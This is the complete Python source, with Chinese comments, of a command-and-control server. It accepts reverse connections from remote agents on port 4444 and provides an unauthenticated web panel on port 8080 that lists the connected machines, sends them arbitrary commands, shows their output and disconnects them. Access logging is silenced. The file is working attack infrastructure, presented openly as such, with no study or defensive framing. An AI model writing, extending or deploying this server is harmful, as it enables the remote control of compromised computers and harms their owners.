#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
server.py —— C2 Web 管理器(前后端分离)

启动:
    python3 server.py

监听:
    0.0.0.0:4444    agent (client.cpp / client.py) 反向连接
    0.0.0.0:8080    浏览器 Web 管理界面

Web:
    GET  /                       主页(web/index.html)
    GET  /machine.html?id=<id>   终端页(web/machine.html)
    GET  /machine/<id>           302 → /machine.html?id=<id>
    GET  /<file>                 静态文件兜底(web/*)

API:
    GET  /api/clients            机器列表 JSON
    GET  /api/output?client=<id> 该 client 累积输出(text/plain)
    POST /api/exec?client=<id>   body: cmd=<cmd>  往 client 发命令
    GET  /api/kick?client=<id>   给该 client 发 exit,让它自己下线

文件:
    server.py           后端(本文件)
    web/index.html      主页 HTML
    web/index.js        主页 JS
    web/machine.html    终端页 HTML
    web/machine.js      终端页 JS
    web/style.css       公共样式

设计要点(避免上一版的 GIL + threading + input() 死锁):
    1) 主线程跑 selectors 事件循环,接管所有 C2 socket 的 accept/recv/send
    2) HTTP server 跑在后台线程,共享 clients 状态(加锁)
    3) 完全异步,无 thread-per-client 模型
"""

import http.server
import json
import re
import selectors
import socket
import sys
import threading
import time
from pathlib import Path
from urllib.parse import urlparse, parse_qs

# ---------- 配置 ----------
C2_HOST   = "0.0.0.0"
C2_PORT   = 4444
WEB_HOST  = "0.0.0.0"
WEB_PORT  = 8080

# ---------- 共享状态 ----------
sel = None                       # 主线程的 selector(只主线程用)
clients_lock = threading.Lock()
clients: dict = {}               # fd -> Connection
pending_close: set = set()       # 待关闭 fd 集合(跨线程)
pending_close_lock = threading.Lock()

def now_ts() -> str:
    return time.strftime("%H:%M:%S")

def log(msg: str) -> None:
    print(f"[{now_ts()}] {msg}", flush=True)

# ---------- Connection ----------

class Connection:
    __slots__ = ("sock", "addr", "fd", "name", "banner",
                 "connected_at", "last_seen",
                 "inbuf", "outbuf",
                 "inbuf_lock", "outbuf_lock")

    def __init__(self, sock, addr):
        self.sock = sock
        self.addr = addr
        self.fd = sock.fileno()
        self.name = f"{addr[0]}:{addr[1]}"
        self.banner = ""
        self.connected_at = time.time()
        self.last_seen = time.time()
        self.inbuf = bytearray()
        self.outbuf = bytearray()
        self.inbuf_lock = threading.Lock()
        self.outbuf_lock = threading.Lock()

    def on_read(self) -> None:
        try:
            data = self.sock.recv(65536)
        except BlockingIOError:
            return
        if not data:
            raise ConnectionError("peer closed")
        self.last_seen = time.time()
        with self.inbuf_lock:
            self.inbuf.extend(data)
            if not self.banner:
                # 抓第一行作为 banner
                line, _, _ = bytes(self.inbuf).partition(b"\n")
                try:
                    line = line.decode(errors="replace").rstrip("\r")
                except Exception:
                    line = ""
                if line:
                    self.banner = line
                    short = line[:40] + ("…" if len(line) > 40 else "")
                    self.name = f"{self.addr[0]}:{self.addr[1]} | {short}"

    def on_write(self) -> None:
        with self.outbuf_lock:
            if not self.outbuf:
                return
            try:
                sent = self.sock.send(self.outbuf)
            except BlockingIOError:
                return
            del self.outbuf[:sent]

    def send_cmd(self, cmd: str) -> None:
        # 写 outbuf 供主线程发送
        with self.outbuf_lock:
            self.outbuf.extend((cmd + "\n").encode())
        # 同步在 inbuf 留一行发送记录,前端能立刻看到自己发了什么
        with self.inbuf_lock:
            self.inbuf.extend(f"[{now_ts()}] >> {cmd}\n".encode())

    def close(self) -> None:
        # 只在主线程调
        try:
            sel.unregister(self.sock)
        except Exception:
            pass
        try:
            self.sock.close()
        except Exception:
            pass
        with clients_lock:
            clients.pop(self.fd, None)

# ---------- C2 主循环 ----------

def main_loop() -> None:
    global sel
    sel = selectors.DefaultSelector()
    lsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    lsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    lsock.bind((C2_HOST, C2_PORT))
    lsock.listen(128)
    lsock.setblocking(False)
    sel.register(lsock, selectors.EVENT_READ, ("listener", None))
    log(f"[*] C2 listening on {C2_HOST}:{C2_PORT}")

    while True:
        # 处理跨线程的踢人请求
        with pending_close_lock:
            for fd in list(pending_close):
                c = clients.get(fd)
                if c:
                    c.close()
                pending_close.discard(fd)

        events = sel.select(1.0)
        for key, mask in events:
            tag, obj = key.data
            if tag == "listener":
                try:
                    conn, addr = lsock.accept()
                    conn.setblocking(False)
                    c = Connection(conn, addr)
                    sel.register(conn,
                                 selectors.EVENT_READ | selectors.EVENT_WRITE,
                                 ("client", c))
                    with clients_lock:
                        clients[c.fd] = c
                    log(f"[+] connected  {c.name}  (fd={c.fd})")
                except Exception as e:
                    log(f"[!] accept: {e}")
            else:
                c = obj
                if mask & selectors.EVENT_READ:
                    try:
                        c.on_read()
                    except Exception as e:
                        log(f"[-] closed    {c.name}  ({e})")
                        c.close()
                        continue
                if mask & selectors.EVENT_WRITE:
                    try:
                        c.on_write()
                    except Exception as e:
                        log(f"[-] closed    {c.name}  ({e})")
                        c.close()
                        continue

# ---------- 静态文件 ----------

# 前端拆到 web/ 目录,server.py 只做 API + static file serving
STATIC_DIR = Path(__file__).parent / "web"

# 文件后缀 -> Content-Type
_MIME = {
    ".html": "text/html; charset=utf-8",
    ".htm":  "text/html; charset=utf-8",
    ".js":   "application/javascript; charset=utf-8",
    ".mjs":  "application/javascript; charset=utf-8",
    ".css":  "text/css; charset=utf-8",
    ".json": "application/json; charset=utf-8",
    ".png":  "image/png",
    ".jpg":  "image/jpeg",
    ".jpeg": "image/jpeg",
    ".gif":  "image/gif",
    ".svg":  "image/svg+xml",
    ".ico":  "image/x-icon",
    ".woff": "font/woff",
    ".woff2": "font/woff2",
}

# ---------- HTTP handler ----------

class Handler(http.server.BaseHTTPRequestHandler):
    # 静默 access log
    def log_message(self, fmt, *args):
        pass

    # ----- 响应工具 -----
    def _send(self, body: bytes, status: int, ctype: str) -> None:
        self.send_response(status)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(body)

    def _json(self, obj, status: int = 200) -> None:
        self._send(json.dumps(obj, ensure_ascii=False).encode(),
                   status, "application/json; charset=utf-8")

    def _html(self, html: str, status: int = 200) -> None:
        self._send(html.encode(), status, "text/html; charset=utf-8")

    def _text(self, text: str, status: int = 200) -> None:
        self._send(text.encode(), status, "text/plain; charset=utf-8")

    def _send_file(self, path: Path) -> None:
        """从 STATIC_DIR 安全地 serve 一个静态文件"""
        # 防穿越
        try:
            resolved = path.resolve()
            if not str(resolved).startswith(str(STATIC_DIR.resolve())):
                return self._text("forbidden", 403)
        except Exception:
            return self._text("bad path", 400)
        if not resolved.is_file():
            return self._text("not found", 404)
        ext = resolved.suffix.lower()
        ctype = _MIME.get(ext, "application/octet-stream")
        try:
            body = resolved.read_bytes()
        except Exception as e:
            return self._text(f"read err: {e}", 500)
        self._send(body, 200, ctype)

    def _static(self, rel: str) -> None:
        """按 URL 相对路径 serve 静态文件,/ 默认映射到 index.html"""
        # 先去掉前导 /,避免 Path / 操作符把它当绝对路径
        rel = rel.lstrip("/")
        if rel == "":
            rel = "index.html"
        self._send_file(STATIC_DIR / rel)

    def _qint(self, qs, key):
        v = qs.get(key, [None])[0]
        if v is None: return None
        try: return int(v)
        except ValueError: return None

    # ----- GET -----
    def do_GET(self):
        path = urlparse(self.path).path
        qs   = parse_qs(urlparse(self.path).query)

        if path == "/api/clients":
            with clients_lock:
                arr = [{
                    "id":           c.fd,
                    "name":         c.name,
                    "addr":         f"{c.addr[0]}:{c.addr[1]}",
                    "connected_at": c.connected_at,
                    "last_seen":    c.last_seen,
                    "banner":       c.banner,
                } for c in clients.values()]
            return self._json(arr)

        if path == "/api/output":
            cid = self._qint(qs, "client")
            if cid is None:
                return self._json({"err": "missing client"}, 400)
            with clients_lock:
                c = clients.get(cid)
            if c is None:
                return self._json({"err": "no such client"}, 404)
            with c.inbuf_lock:
                body = bytes(c.inbuf)
            return self._text(body.decode(errors="replace"))

        if path == "/api/kick":
            cid = self._qint(qs, "client")
            if cid is None:
                return self._json({"err": "missing client"}, 400)
            with clients_lock:
                c = clients.get(cid)
            if c is None:
                return self._json({"err": "no such client"}, 404)
            c.send_cmd("exit")
            # 等 client 自己关 socket 后主线程会清掉
            with pending_close_lock:
                pending_close.add(c.fd)
            return self._json({"ok": True})

        # /machine/{id} → 302 重定向到 /machine.html?id={id}
        m = re.match(r"^/machine/(\d+)$", path)
        if m:
            self.send_response(302)
            self.send_header("Location", f"/machine.html?id={m.group(1)}")
            self.send_header("Content-Length", "0")
            self.end_headers()
            return

        # / → 静态文件兜底
        if not path.startswith("/api/"):
            return self._static(path)

        return self._text("not found", 404)

    # ----- POST -----
    def do_POST(self):
        path = urlparse(self.path).path
        qs   = parse_qs(urlparse(self.path).query)
        if path != "/api/exec":
            return self._json({"err": "no such endpoint"}, 404)
        cid = self._qint(qs, "client")
        if cid is None:
            return self._json({"err": "missing client"}, 400)
        with clients_lock:
            c = clients.get(cid)
        if c is None:
            return self._json({"err": "no such client"}, 404)
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode(errors="replace")
        form = parse_qs(body)
        cmds = form.get("cmd", [])
        if not cmds:
            return self._json({"err": "missing cmd"}, 400)
        c.send_cmd(cmds[0])
        return self._json({"ok": True, "cmd": cmds[0]})

# ---------- 启动 ----------

def main() -> None:
    httpd = http.server.ThreadingHTTPServer((WEB_HOST, WEB_PORT), Handler)
    t = threading.Thread(target=httpd.serve_forever, daemon=True)
    t.start()
    log(f"[*] web manager  http://{WEB_HOST}:{WEB_PORT}/")
    print(f"    浏览器打开: http://localhost:{WEB_PORT}/", flush=True)
    try:
        main_loop()
    except KeyboardInterrupt:
        log("[*] bye")
        sys.exit(0)

if __name__ == "__main__":
    main()
